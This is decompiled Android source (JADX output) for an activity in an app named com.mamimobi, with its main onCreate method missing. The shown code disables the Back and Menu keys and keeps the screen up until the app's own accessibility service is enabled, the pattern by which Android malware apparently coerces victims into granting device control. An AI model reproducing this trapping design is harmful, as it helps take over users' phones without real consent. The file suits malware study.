package com.mamimobi.activity;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.provider.Settings;
import android.text.TextUtils;
import android.view.KeyEvent;
import com.mamimobi.AccessService;
import com.mamimobi.service.SSService;
import defpackage.f11;
import java.util.concurrent.atomic.AtomicBoolean;

/* JADX INFO: loaded from: classes.dex */
public class NavigatorSettingActivity extends Activity {
    public static Context E;

    @Override // android.app.Activity
    public final void finish() {
        super.finishAndRemoveTask();
    }

    /* JADX WARN: Can't wrap try/catch for region: R(14:0|2|(1:4)|5|21|6|(2:25|9)|(7:10|(1:27)(1:13)|15|23|16|17|18)|12|15|23|16|17|18) */
    @Override // android.app.Activity
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public final void onCreate(android.os.Bundle r9) {
        /*
            Method dump skipped, instruction units count: 203
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.mamimobi.activity.NavigatorSettingActivity.onCreate(android.os.Bundle):void");
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        super.onDestroy();
        SSService.K.set(false);
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public final boolean onKeyDown(int i, KeyEvent keyEvent) {
        if (i == 4 || i == 82) {
            return true;
        }
        return super.onKeyDown(i, keyEvent);
    }

    @Override // android.app.Activity
    public final void onResume() {
        super.onResume();
        AtomicBoolean atomicBoolean = f11.a;
        try {
            ComponentName componentName = new ComponentName(this, (Class<?>) AccessService.class);
            String string = Settings.Secure.getString(getContentResolver(), "enabled_accessibility_services");
            if (string == null) {
                return;
            }
            TextUtils.SimpleStringSplitter simpleStringSplitter = new TextUtils.SimpleStringSplitter(':');
            simpleStringSplitter.setString(string);
            while (simpleStringSplitter.hasNext()) {
                ComponentName componentNameUnflattenFromString = ComponentName.unflattenFromString(simpleStringSplitter.next());
                if (componentNameUnflattenFromString != null && componentNameUnflattenFromString.equals(componentName)) {
                    super.finishAndRemoveTask();
                    return;
                }
            }
        } catch (Exception unused) {
        }
    }

    @Override // android.app.Activity
    public final void onStop() {
        super.onStop();
    }
}
